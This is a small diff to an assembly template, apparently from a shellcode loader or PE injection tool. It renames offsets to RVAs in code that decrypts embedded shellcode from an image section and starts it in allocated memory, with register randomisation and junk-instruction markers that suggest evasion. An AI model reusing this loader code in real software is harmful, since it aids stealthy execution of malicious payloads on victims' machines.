@@ -370,7 +370,7 @@ entry:
 
   // extract encrypted shellcode from section
   mov esi, {{.RegN.edi}}                       {{igi}} // address of image base
-  add esi, {{hex .PayloadOffset}}              {{igi}} // address of encrypted shellcode
+  add esi, {{hex .PayloadRVA}}                 {{igi}} // address of encrypted shellcode
   mov edi, [esp+0x0C]                          {{igi}} // address of allocated memory page
   add edi, {{hex .EntryOffset}}                {{igi}} // address of shellcode
   mov {{.RegV.ecx}}, {{hex .PayloadSize}}      {{igi}} // set loop times
@@ -407,7 +407,7 @@ entry:
 {{if .NeedCreateThread}}
   {{if .NeedShellcodeJumper}}
     mov {{.RegV.ecx}}, {{.RegN.edi}}           {{igi}} // address of image base
-    add {{.RegV.ecx}}, {{hex .JumperOffset}}   {{igi}} // address of jumper
+    add {{.RegV.ecx}}, {{hex .JumperRVA}}      {{igi}} // address of shellcode jumper
     mov {{.RegV.edx}}, [esp+0x04]              {{igi}} // address of memory page
     add {{.RegV.edx}}, {{hex .EntryOffset}}    {{igi}} // address of shellcode
   {{else}}
